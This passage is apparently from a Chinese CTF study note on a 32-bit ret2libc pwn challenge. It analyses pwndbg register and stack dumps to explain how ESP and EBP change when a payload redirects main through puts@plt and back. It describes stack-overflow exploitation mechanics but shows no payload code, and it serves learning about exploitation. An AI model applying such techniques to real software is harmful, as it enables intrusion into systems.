           ; *EIP 0x8048460 (puts@plt) ◂— jmp dword ptr [0x804a018]; 执行ret(pop EIP), 导致ESP+4, EIP改变
```

划重点：

- 两次进入main时，在函数序言前，EBP ESP的值是不同的
  - 1st main:   EBP  0                   ESP  0xffffd42c 
  - 2nd main: EBP  0x41414141  ESP  0xffffd434. 0xffffd434-0xffffd42c=8. 第二次ESP比第一次地址高8
- 函数需要结束后，即执行完`add  esp, -80h`，调整完栈高度后：
  - 1st main:  EBP  0xffffd428     ESP  0xffffd3a0. 函数需要中有`push ebp`导致ESP-4. 0xffffd428 = 0xffffd42c-4; esp经16bit对齐，-80h
  - 2nd main: EBP  0xffffd430     ESP  0xffffd3b0

小结论(至少在本例成立)：

- `ret`依据的是ESP指向的地址来`pop EIP`，与EBP无关。本例1st main执行在`ret`前，EBP已被覆盖，ESP指向原本的EBP+4，也就是函数序言前的ESP+4，RA处。执行`ret`导致EIP的值被赋值为函数序言前的ESP + 4 处的值



```assembly
; 栈帧变化
ffffd434 ; 2nd main序言前ESP(相比1st main + 8)
ffffd430 ; 2nd main序言后EBP(push ebp; mov ebp, esp)
ffffd42c ; 1st main序言前ESP
ffffd428 ; 1st main序言后EBP(push ebp; mov ebp, esp)
...
ffffd3b0 ; 2nd main序言后ESP(main 1,2 相差 0x10)
...
ffffd3a0 ; 1st main序言后ESP(ffffd428经对齐后为ffffd420这样与ffffd430差0x10，然后经过相同的调整栈高度后，也相差0x10)
```

小猜测：

- payload1改变了执行流程，`___libc_start_main`调用main后没有执行`___libc_start_main`的尾声，而是先调用puts（完整），然后返回到main继续执行。那么....`___libc_start_main`的前面一部分执行了两次？那栈怎么会变高了？多执行了函数序言，应该会让栈变低才对（地址变低）。同时，为什么两次执行main函数时，调用main的函数不同？第二次调用时为`__libc_start_main@got.plt`，第一次为`__libc_start_main+262`

如果不使用payload1执行，在main `ret`后，栈变化与函数跳转如下：

```assembly
pwndbg> ni ; 将断点下在main的ret处
0xf7de8e46 in __libc_start_main (main=0x8048618 <main>, argc=1, argv=0xffffd4d4, init=0x80486a0 <__libc_csu_init>, fini=0x8048710 <__libc_csu_fini>, rtld_fini=0xf7fe4080 <_dl_fini>, stack_end=0xffffd4cc) at ../csu/libc-start.c:308
308     ../csu/libc-start.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0xf7faf580 (_IO_2_1_stdin_) ◂— 0xfbad2288
 EDX  0xfbad2288
 EDI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 EBP  0x0
*ESP  0xffffd430 ◂— 0x1
*EIP  0xf7de8e46 (__libc_start_main+262) ◂— add    esp, 0x10
────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────
   0x8048695  <main+125>                 ret ; 断点下的地方，然后ni 汇编层单步步过
    ↓                                                     ; 跳转到了 __libc_start_main 函数中 
 ► 0xf7de8e46 <__libc_start_main+262>    add    esp, 0x10 ; esp + 16
   0xf7de8e49 <__libc_start_main+265>    sub    esp, 0xc  ; esp - 12
   0xf7de8e4c <__libc_start_main+268>    push   eax       ; esp - 4
   0xf7de8e4d <__libc_start_main+269>    call   exit <exit>

   0xf7de8e52 <__libc_start_main+274>    push   esi
   0xf7de8e53 <__libc_start_main+275>    push   esi
   0xf7de8e54 <__libc_start_main+276>    mov    esi, dword ptr [esp + 0x80]
   0xf7de8e5b <__libc_start_main+283>    push   dword ptr [esi]
   0xf7de8e5d <__libc_start_main+285>    mov    esi, dword ptr [esp + 0x18]
   0xf7de8e61 <__libc_start_main+289>    lea    edx, [esi - 0x59434]
───────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────
00:0000│ esp  0xffffd430 ◂— 0x1
01:0004│      0xffffd434 —▸ 0xffffd4d4 —▸ 0xffffd633 ◂— '/home/kali/CTF/pwn/ret2libc3'
02:0008│      0xffffd438 —▸ 0xffffd4dc —▸ 0xffffd650 ◂— 'USER=kali'
03:000c│      0xffffd43c —▸ 0xffffd464 ◂— 0x0
04:0010│      0xffffd440 —▸ 0xffffd474 ◂— 0x2e71ec22
05:0014│      0xffffd444 —▸ 0xf7ffdb40 —▸ 0xf7ffdae0 —▸ 0xf7fcb3e0 —▸ 0xf7ffd980 ◂— ...
06:0018│      0xffffd448 —▸ 0xf7fcb410 —▸ 0x804833d ◂— inc    edi /* 'GLIBC_2.0' */
07:001c│      0xffffd44c —▸ 0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────
 ► f 0 f7de8e46 __libc_start_main+262
```



